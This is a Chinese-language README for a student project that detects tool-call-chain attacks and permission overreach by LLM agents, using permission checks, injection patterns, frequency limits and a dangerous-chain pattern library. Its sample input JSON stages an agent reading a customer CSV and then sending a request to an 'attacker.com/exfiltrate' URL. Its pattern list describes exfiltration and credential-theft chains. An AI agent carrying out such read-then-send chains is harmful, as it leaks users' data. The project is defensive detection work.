# 工具调用链攻击检测系统

面向大模型智能体的工具调用链攻击与权限越界检测技术研究

## 项目简介

本项目实现了一个实时检测系统，用于检测和阻止LLM Agent的工具调用链攻击。系统采用**策略+链模式混合规则引擎**（技术路线C），能够实时检测以下4类威胁：

1. **权限违规** - 工具不在白名单或在黑名单中
2. **参数注入** - SQL注入、命令注入、路径遍历等
3. **危险链模式** - 如 `read_file → http_request`（数据外泄）
4. **频率异常** - 短时间内大量工具调用

## 技术借鉴

本项目借鉴了两个开源项目的核心模块：

### 1. ZIRAN（Python）
- **借鉴内容**：危险链模式库（100+模式）、工具风险分类器、输入格式
- **来源**：`ziran/application/knowledge_graph/chain_patterns.yaml`
- **来源**：`ziran/domain/tool_classifier.py`

### 2. Pipelock（Go）
- **借鉴内容**：子序列匹配算法
- **翻译**：将Go代码翻译成Python实现
- **来源**：`pipelock/internal/mcp/chains/matcher.go`

## 项目结构

```
tool_chain_attack_detection/
├── src/
│   ├── core/                    # 核心检测引擎
│   │   ├── detector.py          # 实时检测器（主入口）
│   │   ├── chain_matcher.py     # 子序列匹配算法
│   │   ├── permission_checker.py # 权限策略检查
│   │   ├── injection_checker.py # 参数注入检查
│   │   ├── frequency_checker.py # 频率异常检查
│   │   └── risk_scorer.py       # 风险评分计算
│   ├── models/                  # 数据模型
│   │   ├── input.py             # 输入格式（参考ZIRAN）
│   │   ├── alert.py             # 告警模型
│   │   └── report.py            # 报告模型（生成Markdown）
│   └── rules/                   # 规则配置
│       ├── chain_patterns.yaml  # 危险链模式库
│       ├── permission_policy.yaml # 权限策略
│       ├── tool_classifier.py   # 工具分类器
│       └── injection_patterns.py # 注入检测模式
├── examples/                    # 示例数据
│   ├── normal_session.json      # 正常场景
│   └── attack_session.json      # 攻击场景
├── reports/                     # 生成的报告
├── main.py                      # 主程序入口
└── requirements.txt             # Python依赖
```

## 安装

```bash
# 安装依赖
pip install -r requirements.txt
```

## 使用方法

### 基本使用

```bash
# 检测攻击场景
python main.py --input examples/attack_session.json --output reports/attack_report.md

# 检测正常场景
python main.py --input examples/normal_session.json --output reports/normal_report.md
```

### 命令行参数

```bash
python main.py --help
```

参数说明：
- `--input`, `-i`: 输入数据路径（JSON格式）
- `--output`, `-o`: 输出报告路径（Markdown格式）
- `--rules`, `-r`: 规则配置目录

## 输入格式

输入数据为JSON格式，包含工具调用序列：

```json
{
  "session_id": "session_001",
  "agent_name": "customer_support_agent",
  "tool_calls": [
    {
      "tool_name": "read_file",
      "arguments": {"path": "/data/customers.csv"},
      "timestamp": "2024-01-15T10:30:00Z"
    },
    {
      "tool_name": "http_request",
      "arguments": {"url": "https://attacker.com/exfiltrate"},
      "timestamp": "2024-01-15T10:30:10Z"
    }
  ]
}
```

## 输出格式

输出为Markdown格式的检测报告，包含：

- 检测摘要（会话ID、工具调用数、告警数、风险评分）
- 风险判定（SAFE/SUSPICIOUS/MALICIOUS）
- 告警详情（告警类型、风险等级、工具链、建议）
- 工具调用时间线
- 统计分析

示例报告见：`reports/security_report.md`

## 核心算法

### 子序列匹配算法

从Pipelock项目翻译的核心算法，用于检测危险的工具调用链：

```python
def subsequence_match(buffer, pattern, max_gap=5):
    """
    子序列匹配：不要求连续，但要求顺序，且中间间隔不超过max_gap
    """
    for start_idx in range(len(buffer)):
        if buffer[start_idx] != pattern[0]:
            continue

        pattern_idx = 0
        for i in range(start_idx, len(buffer)):
            if buffer[i] == pattern[pattern_idx]:
                pattern_idx += 1
                if pattern_idx == len(pattern):
                    return True
            elif i - start_idx > max_gap:
                break

    return False
```

## 危险模式库

项目包含30+个危险模式，分为以下类别：

- **数据外泄** - `read_file → http_request`
- **代码执行** - `execute_sql → shell`
- **权限提升** - `read_file → write_file → shell`
- **文件系统攻击** - `http_request → write_file`
- **命令注入** - `read_file → shell`
- **认证绕过** - `read_env → http_request`
- **会话劫持** - `read_file → write_file`
- **数据污染** - `http_request → write_file`
- 更多...

完整模式列表见：`src/rules/chain_patterns.yaml`

## 风险评分系统

- **SAFE（安全）**: 0-29分
- **SUSPICIOUS（可疑）**: 30-69分
- **MALICIOUS（恶意）**: 70-100分

评分因素：
- 告警类型权重
- 风险等级加成
- 链长度加成
- 频率异常程度

## 课程信息

- **课程名称**: 软B课程
- **项目名称**: 面向大模型智能体的工具调用链攻击与权限越界检测技术研究
- **学生**: 莫昊曈（2023311222）
- **技术路线**: C（策略+链模式混合规则引擎）
- **代码规模**: ~250行核心代码

## 参考资料

1. ZIRAN - LLM Agent安全测试工具
2. Pipelock - MCP工具链保护工具
3. LLM Guard - LLM安全护栏
4. NeMo Guardrails - LLM对话控制框架

## License

MIT License
